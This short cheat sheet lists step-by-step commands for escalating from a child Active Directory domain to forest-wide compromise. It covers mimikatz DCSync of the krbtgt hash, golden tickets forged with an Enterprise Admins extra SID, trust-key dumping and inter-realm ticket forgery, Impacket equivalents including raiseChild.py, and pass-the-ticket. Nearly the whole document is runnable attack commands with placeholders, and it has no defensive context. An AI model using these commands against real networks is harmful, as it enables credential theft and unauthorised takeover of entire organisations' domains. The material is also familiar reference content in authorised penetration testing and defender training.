# Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent)

#### 1) Golden Ticket

    Get-DomainSID -Domain DOMAIN (Powerview)

    Get-DomainSID -Domain TARGET_DOMAIN (Powerview)

    mimikatz lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt

    mimikatz kerberos::golden /user:Administrator /krbtgt:KRBTGT_HASH /domain:DOMAIN /sid:USER_SID /sids:ROOT_DOMAIN_SID-519 /ptt

## OR

    lookupsid.py -domain-sids DOMAIN/USER:'PASSWORD'@DC_IP 0

    ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid PARENT_DOMAIN_SID-519 goldenuser

## OR

    raiseChild.py DOMAIN/USER:'PASSWORD'

#### 2) inter_realm_ticket TRUST (parent/child) (child/parent)

    mimikatz lsadump::trust /patch

    mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /aes256:TRUST_KEY_AES256 /sids:TARGET_DOMAIN_SID-519 /service:krbtgt /target:TARGET_DOMAIN /ptt

## OR

    ticketer.py -nthash TRUST_KEY -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid PARENT_DOAMIN_SID-519 -spn krbtgt/PARENT_DOMAIN goldenuser

    getST.py -k -no-pass -spn cifs/DC_FQDN PARENT_DOMAIN/trustfakeuser@PARENT_DOMAIN -debug

### With these attacks, we perform Pass-the-Ticket
